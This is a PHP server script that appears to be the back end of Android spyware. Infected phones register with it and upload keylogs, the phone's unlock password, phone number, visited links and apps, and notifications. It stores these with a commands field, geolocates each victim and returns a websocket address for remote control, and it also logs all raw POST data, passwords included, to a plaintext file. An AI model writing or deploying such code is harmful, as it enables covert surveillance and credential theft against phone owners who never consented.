<?php
date_default_timezone_set('Asia/Shanghai');
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// 调试日志
$logFile = __DIR__ . '/debug_requests.log';
$logData = "[" . date('Y-m-d H:i:s') . "] " . $_SERVER['REQUEST_METHOD'] . " from " . $_SERVER['REMOTE_ADDR'] . "\n";
$logData .= "POST: " . json_encode($_POST, JSON_UNESCAPED_UNICODE) . "\n\n";
file_put_contents($logFile, $logData, FILE_APPEND);

require_once '../private/Eaod85401.php';
require_once __DIR__ . '/../vendor/autoload.php';

use MaxMind\Db\Reader;

function getCountry($ipAddress)
{
    try {
        $databasePath = __DIR__ . '/assets/GeoIP/GeoLite2-City.mmdb'; // 使用 City 数据库
        $reader = new Reader($databasePath);
        $record = $reader->get($ipAddress);
        $reader->close();

        if (isset($record['country']['names']['en'])) {
            return $record['country']['names']['en'];
        } else {
            logToFile("WARN: Country not found for IP: $ipAddress");
            return 'unknown';
        }
    } catch (Exception $e) {
        logToFile("ERROR: " . $e->getMessage());
        return 'not found';
    }
}

function logToFile($message)
{
    $logFile = __DIR__ . '/geoip_errors.log';
    $log = "[" . date("Y-m-d H:i:s") . "] $message\n";
    file_put_contents($logFile, $log, FILE_APPEND);
}

function generateUUID()
{
    return sprintf(
        '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff)
    );
}

function isBase64($str)
{
    return preg_match('/^[a-zA-Z0-9\/\r\n+]*={0,2}$/', $str) && strlen($str) % 4 == 0;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    try {
        $pdo = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        // 参数
        $userEmail      = $_POST['user_email'] ?? 'empty';
        $phone_id       = $_POST['phone_id'] ?? '';
        $phoneName      = $_POST['phone_name'] ?? '';
        $androidVersion = $_POST['android_version'] ?? '';
        $model          = $_POST['model'] ?? '';
        $phonepassword  = $_POST['phone_password'] ?? '';
        $phonenumber    = $_POST['phone_number'] ?? '';
        $batteryCharge  = $_POST['battery_charge'] ?? '';
        $network        = $_POST['network'] ?? '';
        $installDate    = $_POST['install_date'] ?? '';
        $phone_idf      = $_POST['idf'] ?? '';
        $wallp          = $_POST['wallpap'] ?? '-1';
        $keylogs        = $_POST['keylogs'] ?? '';
        $visitedlinks   = $_POST['vLinks'] ?? '';
        $visitedapps    = $_POST['vapps'] ?? '';
        $notifications  = $_POST['notifys'] ?? '';
        $activz         = $_POST['activz'] ?? '';
        $isonline = array_key_exists('isonline', $_POST) ? $_POST['isonline'] : '1';
        $accessibility  = $_POST['accessibility'] ?? '0';
        $address        = $_SERVER['REMOTE_ADDR'];
        $country        = getCountry($address);

        if ($wallp !== '-1' && !isBase64($wallp)) {
            $wallp = '-1';
        }

        // 如果 phone_id 为空，生成一个新的 UUID
        if ($phone_id === 'empty' || empty($phone_id)) {
            $phone_id = generateUUID();
        }
        // 判断如果安卓版本、型号和安装日期都为空，则不插入数据库
        if (empty($phoneName) && empty($androidVersion) && empty($model) && empty($installDate)) {
            // 如果三个字段都为空，则跳过插入操作
            echo "Skipping insert: Android version, model, and install date are all empty.";
            exit; // 退出，避免插入数据库
        }

        // ✅ 正确字段是 usrname，不是 username
        $stmt = $pdo->prepare("SELECT usrname FROM users WHERE email = ?");
        $stmt->execute([$userEmail]);
        $usrname = $stmt->fetchColumn();

        // if (!$usrname) {
        //     http_response_code(400);
        //     echo "Invalid user.";
        //     exit;
        // }

        $timenow = date('Y-m-d H:i:s');
        $defaultOptions = '{"Activities":"0","keystrokes":"1","notifications":"1","visitedapps":"0","visitedlinks":"0","livenotify":"0"}';

        $stmt = $pdo->prepare("
            INSERT INTO phones (
                phone_id, usrname, phone_name, country, address, android_ver, model, phonepassword,
                phonenumber, wallpaper, battery_charg, network, install_date, last_ping,
                files_path, files_data, mob_permissions, keylogs_dates, visited_links,
                visited_apps, notifications, activities, phone_options, session_id,
                Commands, isonline, isRemoved, accessibility
            ) VALUES (
                ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
            )
            ON DUPLICATE KEY UPDATE
                usrname = VALUES(usrname),
                phone_name = VALUES(phone_name),
                country = VALUES(country),
                address = VALUES(address),
                android_ver = VALUES(android_ver),
                model = VALUES(model),
                phonepassword = VALUES(phonepassword),
                phonenumber = VALUES(phonenumber),
                wallpaper = VALUES(wallpaper),
                battery_charg = VALUES(battery_charg),
                network = VALUES(network),
                install_date = VALUES(install_date),
                last_ping = VALUES(last_ping),
                files_path = VALUES(files_path),
                files_data = VALUES(files_data),
                mob_permissions = VALUES(mob_permissions),
                keylogs_dates = VALUES(keylogs_dates),
                visited_links = VALUES(visited_links),
                visited_apps = VALUES(visited_apps),
                notifications = VALUES(notifications),
                activities = VALUES(activities),
                phone_options = VALUES(phone_options),
                session_id = VALUES(session_id),
                Commands = VALUES(Commands),
                isonline = VALUES(isonline),
                isRemoved = VALUES(isRemoved),
                accessibility = VALUES(accessibility)
        ");

        $stmt->execute([
            $phone_id,
            $usrname, // ✅ 使用 usrname 替代 user_id
            $phoneName,
            $country,
            $address,
            $androidVersion,
            $model,
            $phonepassword,
            $phonenumber,
            $wallp,
            $batteryCharge,
            $network,
            $installDate,
            $timenow,
            '',
            '', // files_path, files_data
            null, // mob_permissions
            $keylogs,
            $visitedlinks,
            $visitedapps,
            $notifications,
            $activz,
            $defaultOptions,
            $phone_idf,
            '', // Commands
            $isonline,  // isonline
            0,  // isRemoved
            $accessibility
        ]);

        $authkeys = [
            "sk" => 'ws://192.168.31.35:8888/api/ws'
        ];

        echo "Conf:" . json_encode($authkeys);
    } catch (Exception $e) {
        http_response_code(500);
        echo "ERROR: " . $e->getMessage();
        file_put_contents("log.txt", "异常：" . $e->getMessage() . "\n", FILE_APPEND);
    }
} else {
    http_response_code(405);
    echo "Invalid request method.";
}
